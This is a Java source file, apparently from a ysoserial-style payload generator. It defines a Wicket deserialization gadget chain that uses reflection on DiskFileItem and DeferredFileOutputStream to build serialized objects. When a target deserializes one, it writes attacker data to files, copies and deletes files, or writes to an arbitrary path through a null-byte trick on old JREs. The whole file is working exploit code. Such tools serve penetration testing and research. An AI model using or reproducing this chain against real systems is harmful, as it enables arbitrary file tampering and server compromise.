package com.ppp.chain.others;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import com.ppp.utils.maker.CryptoUtils;
import org.apache.wicket.util.io.DeferredFileOutputStream;
import org.apache.wicket.util.io.ThresholdingOutputStream;
import org.apache.wicket.util.upload.DiskFileItem;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Arrays;

/**
 * @author Whoopsunix
 */
@Dependencies({"org.apache.wicket:wicket-util:6.23.0", "org.slf4j:slf4j-api:1.6.4"})
@Authors({Authors.JACOBAINES})
@Sink({Sink.Default})
public class Wicket implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Wicket.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain((String) sinkObject);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        String[] parts = command.split(";");

        if (parts.length != 3) {
            throw new IllegalArgumentException("Bad command format.");
        }

        if ("copyAndDelete".equals(parts[0])) {
            return copyAndDelete(parts[1], parts[2]);
        }
        else if ("write".equals(parts[0])) {
            return write(parts[1], parts[2].getBytes("US-ASCII"));
        }
        else if ("writeB64".equals(parts[0]) ) {
            return write(parts[1], CryptoUtils.base64decoder(parts[2]));
        }
        else if ("writeOld".equals(parts[0]) ) {
            return writeOldJRE(parts[1], parts[2].getBytes("US-ASCII"));
        }
        else if ("writeOldB64".equals(parts[0]) ) {
            return writeOldJRE(parts[1], CryptoUtils.base64decoder(parts[2]));
        }
        throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
    }

    public void release(DiskFileItem obj) throws Exception {
    }

    private static DiskFileItem copyAndDelete ( String copyAndDelete, String copyTo ) throws IOException, Exception {
        return makePayload(0, copyTo, copyAndDelete, new byte[1]);
    }

    // writes data to a random filename (update_<per JVM random UUID>_<COUNTER>.tmp)
    private static DiskFileItem write ( String dir, byte[] data ) throws IOException, Exception {
        return makePayload(data.length + 1, dir, dir + "/whatever", data);
    }

    // writes data to an arbitrary file
    private static DiskFileItem writeOldJRE(String file, byte[] data) throws IOException, Exception {
        return makePayload(data.length + 1, file + "\0", file, data);
    }

    private static DiskFileItem makePayload(int thresh, String repoPath, String filePath, byte[] data) throws IOException, Exception {
        // if thresh < written length, delete outputFile after copying to repository temp file
        // otherwise write the contents to repository temp file
        File repository = new File(repoPath);
        DiskFileItem diskFileItem = new DiskFileItem("test", "application/octet-stream", false, "test", 100000, repository, null);
        File outputFile = new File(filePath);
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(thresh, outputFile);
        OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
        os.write(data);
        Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        Reflections.setFieldValue(diskFileItem, "dfos", dfos);
        Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
        return diskFileItem;
    }
}
